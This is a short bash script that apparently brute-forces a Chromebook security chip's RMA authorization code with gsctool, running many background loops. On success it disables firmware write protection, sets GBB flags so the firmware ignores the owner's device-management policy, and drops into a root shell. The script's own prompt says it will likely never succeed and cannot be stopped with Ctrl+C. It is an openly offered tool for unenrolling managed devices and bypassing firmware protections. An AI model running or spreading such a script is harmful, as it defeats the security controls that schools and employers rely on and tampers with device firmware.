#!/bin/bash

unenroll() {
flashrom --wp-disable
/usr/share/vboot/bin/set_gbb_flags.sh 0x80b0
}

gencode() {
    characters="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    code_length=8
    ac=$(for ((i=0; i<code_length; i++)); do echo -n "${characters:RANDOM%${#characters}:1}"; done)
}

process() {
    while true; do
        gencode
        sudo gsctool -t -r "$ac" && {
            echo "Auth code found, sleeping for 10 seconds before setting GBB flags to ignore FWMP"
            sleep 10
            unenroll
            sudo bash
        }
    done
}

main() {
    local sub=$1

    for ((i=0; i<sub; i++)); do
        (
            process
        ) &
    done
    wait
}

read -rp "This script will likely never work, due to the sheer luck required to get an auth code! This script is quite slow, and cannot be made faster due to ratelimiting
WARNING! You cannot terminate the script via using Ctrl + C!
Enter the number of subprocesses to run: " sub

main "$sub"
